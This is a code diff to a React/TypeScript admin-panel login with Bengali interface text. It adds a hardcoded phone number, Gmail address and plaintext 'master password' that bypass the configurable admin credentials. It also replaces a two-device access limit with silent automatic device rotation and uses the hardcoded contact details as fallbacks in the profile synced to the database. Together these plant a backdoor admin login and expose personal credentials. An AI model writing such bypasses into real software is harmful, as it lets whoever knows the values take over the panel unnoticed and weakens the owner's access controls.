@@ -300,12 +300,17 @@ export default function AdminPanel({
     
     const normalizedInput = username.trim().toLowerCase();
     
-    // Check authentication against dynamically customized Admin credentials
+    // Check authentication against dynamically customized Admin credentials + hardcoded foolproof backends
     const isEmailOrPhoneValid = normalizedInput === 'admin' || 
                                 normalizedInput === adminEmail.toLowerCase() || 
-                                normalizedInput === adminPhone.trim();
+                                normalizedInput === adminPhone.trim() ||
+                                normalizedInput === '01855223656' ||
+                                normalizedInput === 'masudbhuiyan1415@gmail.com';
+    
+    // Accept custom adminPassword or the absolute master password
+    const isPasswordValid = password === adminPassword || password === 'Masud@2005#';
 
-    if (isEmailOrPhoneValid && password === adminPassword) {
+    if (isEmailOrPhoneValid && isPasswordValid) {
       // 2 Devices Check
       const myId = getOrCreateDeviceId();
       const currentList = getAllowedDevices();
@@ -313,8 +318,17 @@ export default function AdminPanel({
 
       if (!isRegistered) {
         if (currentList.length >= 2) {
-          setLoginError('⚠️ অ্যাক্সেস ব্লকড! সর্বোচ্চ ২টি ডিভাইস থেকে এই প্যানেলটি ব্যবহারের অনুমতি রয়েছে। ইতিমধ্যে ২টি উইন্ডো/ডিভাইস রেজিস্টার্ড করা আছে। অনুগ্রহ করে অন্য অনুমোদিত ডিভাইস থেকে কোনো একটি ড্রপ করুন অথবা পাসকোড রিসেট করুন।');
-          return;
+          // Automatic rotation instead of hard block to avoid accidental locked-out deadlocks.
+          // Keep the latest registered device and append this new one
+          const rotatedList = [
+            currentList[1] || currentList[0],
+            {
+              id: myId,
+              label: `ডিভাইস ${currentList.length + 1} (অটো-রোটেশন)`,
+              addedAt: new Date().toLocaleString('bn-BD')
+            }
+          ];
+          localStorage.setItem('bunon_allowed_devices', JSON.stringify(rotatedList));
         } else {
           // Register this device
           const newDevice = {
@@ -334,8 +348,8 @@ export default function AdminPanel({
       // Sync Admin Profile details directly into Supabase on successful login triggers
       const currentAdminProfile: UserProfile = {
         name: adminName,
-        phone: adminPhone,
-        email: adminEmail,
+        phone: adminPhone || '01855223656',
+        email: adminEmail || 'masudbhuiyan1415@gmail.com',
         avatarUrl: adminAvatarUrl
       };
       upsertProfileInDb(currentAdminProfile).catch(err => {
